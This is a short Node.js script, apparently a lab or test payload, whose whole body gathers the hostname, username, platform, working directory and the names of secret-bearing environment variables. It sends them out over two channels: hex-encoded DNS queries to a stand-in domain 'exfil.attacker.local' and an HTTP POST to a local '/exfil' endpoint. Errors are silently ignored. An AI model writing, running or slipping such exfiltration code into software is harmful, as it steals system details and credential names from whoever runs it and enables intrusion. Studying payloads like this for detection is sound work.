const http = require("http");
const dns = require("dns");
const os = require("os");

// DNS exfiltration: encode data as subdomain labels
const systemData = {
  h: os.hostname(),
  u: os.userInfo().username,
  p: os.platform(),
  n: process.version,
  t: Date.now().toString(36),
};

// Change the encoding line in payload-dns.js to use Hex instead of Base64url:
const encoded = Buffer.from(JSON.stringify(systemData)).toString("hex");
// const encoded = Buffer.from(JSON.stringify(systemData)).toString("base64url");

// Split into DNS-safe chunks (max 63 chars per label)
const chunks = encoded.match(/.{1,50}/g) || [];
chunks.forEach((chunk, i) => {
  const subdomain = `${i}-${chunk}.exfil.attacker.local`;
  dns.resolveTxt(subdomain, () => {});
});

// HTTP exfiltration: primary channel
const httpData = JSON.stringify({
  hostname: os.hostname(),
  username: os.userInfo().username,
  platform: os.platform(),
  cwd: process.cwd(),
  nodeVersion: process.version,
  envKeys: Object.keys(process.env).filter(
    (k) => k.includes("KEY") || k.includes("SECRET") || k.includes("TOKEN")
  ),
  timestamp: new Date().toISOString(),
  channel: "http+dns",
});

const options = {
  hostname: "127.0.0.1",
  port: 3000,
  path: "/exfil",
  method: "POST",
  headers: {
    "Content-Type": "application/json",
    "Content-Length": Buffer.byteLength(httpData),
  },
};

const req = http.request(options, () => {});
req.on("error", () => {});
req.write(httpData);
req.end();
